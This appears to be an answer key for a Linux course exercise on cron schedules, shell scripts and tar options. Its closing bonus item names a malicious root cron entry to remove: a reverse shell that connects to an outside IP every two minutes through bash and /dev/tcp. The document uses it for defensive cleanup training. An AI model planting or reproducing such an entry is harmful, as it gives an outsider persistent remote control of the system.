## Solution File: Reviewing Crons

### Assessment Solutions

#### Cron

- When will the following `cron` schedules run?

  `*/10 * * * *` 

    **Solution**: At every 10th minute.

- What event is the following `cron` a minute away from?

  `59 23 31 12 *`

    **Solution**: New Years!

What do the following hypothetical `cron` likely do?

- `0 18 * * 1-5 /home/Bob/Sales/sum_of_sales.sh`

    **Solution**: Run a script that adds up all the sales for the work day.

- `@weekly /home/sysadmin/Scripts/auto-update.sh`

    **Solution**: A weekly automated system upate.

#### Scripts

- What is a _shebang_?

    **Solution**: Is the commented file declaration at the top of a shell script.

- Is the `.sh` extension needed for shell scripts?

    **Solution**: Nope! As long as the _shebang_ is there, the file should be able to run as a script!

- What two characters should come before the filename of a script?

    **Solution**: `./`

- Jane's script has _user_ and _group_ ownership of a script with `-rw-r--r--` permissions, but she cannot get it to run. What must she do to the file before it will run?

    **Solution**: Run `chmod +x` on her file!

#### Tar

- How does the `-x` option modify the `tar` command?

    **Solution**: This option will let `tar` extract an archive!

- If a directory has `ten` files and the following command is used in it, how many files are being compressed?

  -  `tar cvvWf backups/archive.tar .`

    **Solution**: All files should be archived as they're all in `.`, the current directory!

- What option prints the full file specification of files as you interact with them?

    **Solution**: `-vv`

- Why is the `-f` option used in almost every `tar` operation?

    **Solution**: The `-f` option lets you designate a `tar` file to either _create_ or _extract_ or _list_ from.

#### Bonus

- Run: `sudo crontab -e` to open the `root` `crontab`.

- The cron you wanted to remove was:

  `*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1`
